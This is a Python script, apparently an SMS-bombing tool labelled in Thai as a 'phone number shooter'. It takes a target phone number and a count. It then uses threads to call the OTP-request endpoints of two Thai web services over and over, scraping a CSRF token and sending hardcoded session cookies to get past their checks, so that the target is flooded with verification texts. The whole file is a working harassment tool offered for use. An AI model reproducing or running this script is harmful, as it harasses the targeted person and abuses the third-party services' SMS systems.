import requests as ru
import threading
import time
import random
import time
import os
import datetime
import sys
import random
from re import search
from requests import Session
from re import search


try:
	from bs4 import BeautifulSoup as bs
	from user_agent import generate_user_agent
	import requests
except ImportError:
	os.system("pip install bs4")
	os.system("pip install user_agent")
	os.system("pip install requests")
	
	
os.system("clear")
print("\t\033[00mยิงเบอร์ : \033[32mCallmex NT")
print()

phone = input("\033[35mเบอร์เป้าหมาย : \033[31m")
num = int(input("\033[35mจำนวนข้อความ : \033[31m"))
print()
print()

def khonde():
	SEND  = ru.Session()
	API_WEB = SEND.get('https://app.khonde.com/register',headers={"User-Agent": generate_user_agent()}).text
	SEND_TOKEN = bs(API_WEB,'html.parser')
	TOKEN = SEND_TOKEN.find("meta",attrs={"name":"csrf-token"})
	SMS = SEND.get(f'https://app.khonde.com/requestOTP/{phone}',headers={"X-XSRF-TOKEN": TOKEN['content'],"User-Agent": generate_user_agent(),"Cookie": "_gid=GA1.2.1429375693.1657960248; _gac_UA-74972330-26=1.1657960248.CjwKCAjww8mWBhABEiwAl6-2RVYe9XsjIIksM_BccLyzFFDX8T_YVTKKPOe2Q0BPyoTwjuzYwh6EyBoCN7wQAvD_BwE; _gat_gtag_UA_74972330_26=1; _fbp=fb.1.1657960248320.1708448457; _tt_enable_cookie=1; _ttp=da5ea560-0a16-4bc0-90d1-3ddd1fc73db4; XSRF-TOKEN=eyJpdiI6IisyMWw5ZnhaS2JXV3FmR3dyV0JGdVE9PSIsInZhbHVlIjoiQnNLQjh6dExTdmh5ZnJZeHNjNkkzd3dMMHpXV1dZV2hROXYyV0NMSnZpOWdQeFdqRU9RQ3Y4M2Y1aXk5Y1QvcFM1V2N0MG9oRUkxQUU3TlFESDlVU21Qa2JMMmxqRHBISFRsOXZGaFVMVGY0ZW1idysrWUVlNTFQWDYvQ1NSWFgiLCJtYWMiOiI1ODRiNTRmOGJkMzRjMzE1YmUxMmQ2Y2NkZWRhOGQ5ZDkwM2MxYWNjMmVmOTk2MzE4MmYzYmQ3ZWFiYWQ1ZjBlIn0%3D; khonde_session=eyJpdiI6IlMyNmpkRWl4NTh1emFLRWNiL0k2ZlE9PSIsInZhbHVlIjoiSEUzNGNnMVFwNGxJNTZVNmVzMWtrQk82NDZ0eGM1ckxrK3VVS1BWZ1NOMDlmbWl5RXdpa2dDMzQrdzIvMkRZeFpwa2dGamdGcFYwcVZWVjhFSjg2elZ1OUFxTWhuV3hIZlV2cFVIVW9VMnBCUEIxVUV6MVp1Y3JPb3JBOXFZeCsiLCJtYWMiOiJiYzM2ZDVhOWFiOTY3NTAyN2RhYTI1NWYwYjZhY2RmYTgxNWRmOGJkOWJhYjcyMGVhYzU0MjE4NGYxYjdlMTU4In0%3D; _ga_X6J1S6LV1V=GS1.1.1657960251.1.0.1657960251.60; _ga=GA1.1.1429094721.1657960248"})
	if SMS.status_code == 200:
		print("\033[32m[+] \033[36mThe sms sent !")
	else:
		print("\033[31m[-] \033[36mThe sms no sent !")
		
def trueshop():
	SMS = requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
	if SMS.status_code == 201:
		print("\033[32m[+] \033[36mThe sms sent !")
	else:
		print("\033[31m[-] \033[36mThe sms no sent !")
		

for i in range(num):
	th = threading.Thread(target=khonde)
	th2 = threading.Thread(target=trueshop)
	th.start()
	time.sleep(5)
	th2.start()
		